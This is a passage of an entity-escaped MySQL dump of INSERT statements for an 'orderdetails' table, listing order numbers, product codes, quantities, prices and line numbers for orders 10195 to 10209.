\u0026#39;S700_2824\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;80.92\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10195\u0026#39;, \u0026#39;S12_4473\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;118.50\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10195\u0026#39;, \u0026#39;S18_2238\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;139.17\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10195\u0026#39;, \u0026#39;S18_2319\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;112.91\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10195\u0026#39;, \u0026#39;S18_3232\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;150.71\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10195\u0026#39;, \u0026#39;S24_1444\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;54.33\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10195\u0026#39;, \u0026#39;S24_2840\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;31.82\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10195\u0026#39;, \u0026#39;S24_4048\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;95.81\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10195\u0026#39;, \u0026#39;S32_2509\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;51.95\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10195\u0026#39;, \u0026#39;S32_3207\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;59.03\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10195\u0026#39;, \u0026#39;S50_1392\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;97.23\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10196\u0026#39;, \u0026#39;S12_1108\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;203.64\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10196\u0026#39;, \u0026#39;S12_3148\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;151.08\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10196\u0026#39;, \u0026#39;S12_3891\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;147.07\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10196\u0026#39;, \u0026#39;S18_3140\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;127.03\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10196\u0026#39;, \u0026#39;S18_3259\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;81.68\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10196\u0026#39;, \u0026#39;S18_4027\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;126.39\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10196\u0026#39;, \u0026#39;S50_1514\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;56.82\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10196\u0026#39;, \u0026#39;S700_1938\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;84.88\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10197\u0026#39;, \u0026#39;S10_4757\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;118.32\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10197\u0026#39;, \u0026#39;S18_3029\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;83.44\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10197\u0026#39;, \u0026#39;S18_3856\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;85.75\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10197\u0026#39;, \u0026#39;S18_4522\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;78.99\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10197\u0026#39;, \u0026#39;S24_2011\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;109.37\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10197\u0026#39;, \u0026#39;S24_3151\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;83.20\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10197\u0026#39;, \u0026#39;S24_3816\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;67.93\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10197\u0026#39;, \u0026#39;S700_1138\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;60.00\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10197\u0026#39;, \u0026#39;S700_2047\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;78.75\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10197\u0026#39;, \u0026#39;S700_2610\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;66.50\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10197\u0026#39;, \u0026#39;S700_3505\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;100.17\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10197\u0026#39;, \u0026#39;S700_3962\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;88.39\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10197\u0026#39;, \u0026#39;S72_1253\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;39.73\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10197\u0026#39;, \u0026#39;S72_3212\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;48.59\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10198\u0026#39;, \u0026#39;S18_1662\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;149.81\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10198\u0026#39;, \u0026#39;S24_2841\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;60.97\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10198\u0026#39;, \u0026#39;S24_3420\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;61.81\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10198\u0026#39;, \u0026#39;S24_3949\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;65.51\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10198\u0026#39;, \u0026#39;S700_2466\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;94.73\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10198\u0026#39;, \u0026#39;S700_4002\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;74.03\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10199\u0026#39;, \u0026#39;S50_1341\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;37.97\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10199\u0026#39;, \u0026#39;S700_1691\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;81.29\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10199\u0026#39;, \u0026#39;S700_3167\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;70.40\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10200\u0026#39;, \u0026#39;S18_2581\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;74.34\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10200\u0026#39;, \u0026#39;S24_1785\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;99.57\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10200\u0026#39;, \u0026#39;S24_4278\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;70.28\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10200\u0026#39;, \u0026#39;S32_1374\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;80.91\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10200\u0026#39;, \u0026#39;S32_4289\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;65.35\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10200\u0026#39;, \u0026#39;S700_2834\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;115.09\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10201\u0026#39;, \u0026#39;S10_1678\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;82.30\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10201\u0026#39;, \u0026#39;S10_2016\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;116.56\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10201\u0026#39;, \u0026#39;S10_4698\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;191.72\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10201\u0026#39;, \u0026#39;S12_2823\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;126.52\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10201\u0026#39;, \u0026#39;S18_2625\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;48.46\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10201\u0026#39;, \u0026#39;S24_1578\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;93.54\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10201\u0026#39;, \u0026#39;S24_2000\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;66.27\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10202\u0026#39;, \u0026#39;S18_3782\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;55.33\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10202\u0026#39;, \u0026#39;S18_4721\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;124.99\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10202\u0026#39;, \u0026#39;S24_2360\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;56.10\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10202\u0026#39;, \u0026#39;S24_4620\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;75.18\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10202\u0026#39;, \u0026#39;S32_2206\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;33.39\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10202\u0026#39;, \u0026#39;S32_4485\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;81.64\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10202\u0026#39;, \u0026#39;S50_4713\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;79.73\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10203\u0026#39;, \u0026#39;S12_1099\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;161.49\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10203\u0026#39;, \u0026#39;S12_3380\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;111.57\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10203\u0026#39;, \u0026#39;S12_3990\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;63.84\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10203\u0026#39;, \u0026#39;S12_4675\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;115.16\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10203\u0026#39;, \u0026#39;S18_1889\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;73.15\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10203\u0026#39;, \u0026#39;S18_3232\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;157.49\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10203\u0026#39;, \u0026#39;S18_3278\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;66.74\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10203\u0026#39;, \u0026#39;S18_3482\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;127.88\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10203\u0026#39;, \u0026#39;S24_2972\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;33.23\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10203\u0026#39;, \u0026#39;S24_3371\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;56.94\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10203\u0026#39;, \u0026#39;S24_3856\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;140.43\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10204\u0026#39;, \u0026#39;S18_1129\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;114.65\u0026#39;, \u0026#39;17\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10204\u0026#39;, \u0026#39;S18_1589\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;113.24\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10204\u0026#39;, \u0026#39;S18_1749\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;153.00\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10204\u0026#39;, \u0026#39;S18_1984\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;133.72\u0026#39;, \u0026#39;16\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10204\u0026#39;, \u0026#39;S18_2248\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;59.33\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10204\u0026#39;, \u0026#39;S18_2325\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;119.50\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10204\u0026#39;, \u0026#39;S18_2870\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;106.92\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10204\u0026#39;, \u0026#39;S18_3685\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;132.80\u0026#39;, \u0026#39;15\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10204\u0026#39;, \u0026#39;S18_4409\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;83.75\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10204\u0026#39;, \u0026#39;S18_4933\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;69.84\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10204\u0026#39;, \u0026#39;S24_1046\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;69.82\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10204\u0026#39;, \u0026#39;S24_1628\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;46.79\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10204\u0026#39;, \u0026#39;S24_2766\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;79.06\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10204\u0026#39;, \u0026#39;S24_2887\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;112.74\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10204\u0026#39;, \u0026#39;S24_3191\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;84.75\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10204\u0026#39;, \u0026#39;S24_3432\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;104.94\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10204\u0026#39;, \u0026#39;S24_3969\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;34.88\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10205\u0026#39;, \u0026#39;S18_1342\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;98.63\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10205\u0026#39;, \u0026#39;S18_1367\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;45.82\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10205\u0026#39;, \u0026#39;S18_2795\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;138.38\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10205\u0026#39;, \u0026#39;S24_1937\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;27.88\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10205\u0026#39;, \u0026#39;S24_2022\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;36.74\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10206\u0026#39;, \u0026#39;S10_1949\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;203.59\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10206\u0026#39;, \u0026#39;S12_1666\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;109.34\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10206\u0026#39;, \u0026#39;S18_1097\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;115.50\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10206\u0026#39;, \u0026#39;S18_2949\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;98.27\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10206\u0026#39;, \u0026#39;S18_2957\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;51.84\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10206\u0026#39;, \u0026#39;S18_3136\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;102.63\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10206\u0026#39;, \u0026#39;S18_3320\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;99.21\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10206\u0026#39;, \u0026#39;S18_4668\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;45.78\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10206\u0026#39;, \u0026#39;S24_4258\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;95.44\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10206\u0026#39;, \u0026#39;S32_3522\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;54.94\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10206\u0026#39;, \u0026#39;S700_2824\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;89.01\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10207\u0026#39;, \u0026#39;S10_4962\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;125.58\u0026#39;, \u0026#39;15\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10207\u0026#39;, \u0026#39;S12_4473\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;95.99\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10207\u0026#39;, \u0026#39;S18_2238\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;140.81\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10207\u0026#39;, \u0026#39;S18_2319\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;109.23\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10207\u0026#39;, \u0026#39;S18_2432\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;60.77\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10207\u0026#39;, \u0026#39;S18_3232\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;140.55\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10207\u0026#39;, \u0026#39;S18_4027\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;143.62\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10207\u0026#39;, \u0026#39;S18_4600\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;119.87\u0026#39;, \u0026#39;16\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10207\u0026#39;, \u0026#39;S24_1444\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;57.80\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10207\u0026#39;, \u0026#39;S24_2300\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;127.79\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10207\u0026#39;, \u0026#39;S24_2840\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;30.76\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10207\u0026#39;, \u0026#39;S24_4048\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;108.82\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10207\u0026#39;, \u0026#39;S32_1268\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;84.75\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10207\u0026#39;, \u0026#39;S32_2509\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;51.95\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10207\u0026#39;, \u0026#39;S32_3207\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;55.30\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10207\u0026#39;, \u0026#39;S50_1392\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;106.49\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10208\u0026#39;, \u0026#39;S12_1108\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;176.63\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10208\u0026#39;, \u0026#39;S12_3148\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;128.42\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10208\u0026#39;, \u0026#39;S12_3891\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;152.26\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10208\u0026#39;, \u0026#39;S18_3140\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;117.47\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10208\u0026#39;, \u0026#39;S18_3259\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;96.81\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10208\u0026#39;, \u0026#39;S18_4522\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;72.85\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10208\u0026#39;, \u0026#39;S24_2011\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;122.89\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10208\u0026#39;, \u0026#39;S24_3151\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;80.54\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10208\u0026#39;, \u0026#39;S50_1514\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;57.99\u0026#39;, \u0026#39;15\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10208\u0026#39;, \u0026#39;S700_1138\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;56.67\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10208\u0026#39;, \u0026#39;S700_1938\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;73.62\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10208\u0026#39;, \u0026#39;S700_2610\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;63.61\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10208\u0026#39;, \u0026#39;S700_3505\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;95.16\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10208\u0026#39;, \u0026#39;S700_3962\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;95.34\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10208\u0026#39;, \u0026#39;S72_3212\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;48.05\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10209\u0026#39;, \u0026#39;S10_4757\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;129.20\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10209\u0026#39;, \u0026#39;S18_3029\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;82.58\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10209\u0026#39;, \u0026#39;S18_3856\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;97.40\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10209\u0026#39;, \u0026#39;S24_2841\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;66.45\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10209\u0026#39;, \u0026#39;S24_3420\u0026#39;, \u0026#39;36\u0026#39;, 